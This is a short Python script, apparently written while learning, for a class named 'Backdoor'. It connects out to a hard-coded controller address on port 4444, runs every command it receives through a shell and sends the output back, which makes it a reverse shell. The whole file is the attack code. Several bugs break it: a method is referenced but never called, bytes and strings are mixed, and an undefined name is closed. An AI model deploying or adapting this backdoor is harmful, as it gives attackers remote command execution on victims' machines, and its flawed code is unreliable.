#!/usr/bin/python3

import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create instance of a connection
        self.connection.connect((ip, port)) #target ip and port 4444 for backdoor access

    def reliable_send(self, data):
        json_data = json.dumps(data) #data converted to json object
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = "" #start empty, add 1024 bytes from TCP stream every loop
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) #override whatever is stored in jason data and add 1024bytes from TCP stream
                return json.loads(json_data) #unwrap json data and return it to me
            except ValueError: 
                continue

    def execute_system_command(self, command):
          return subprocess.check_output(command, shell=True) #execute command and return result

    def run(self):
        while True:
            command = self.reliable_receive #when executed will run json send and recieve
            command_result = self.execute_system_command(command) #data that was passed to function
            self.connection.send(command_result) #send results of the function back to me 
        connection.close() #close connection

my_backdoor = Backdoor("10.0.0.0", 4444)
my_backdoor.run()
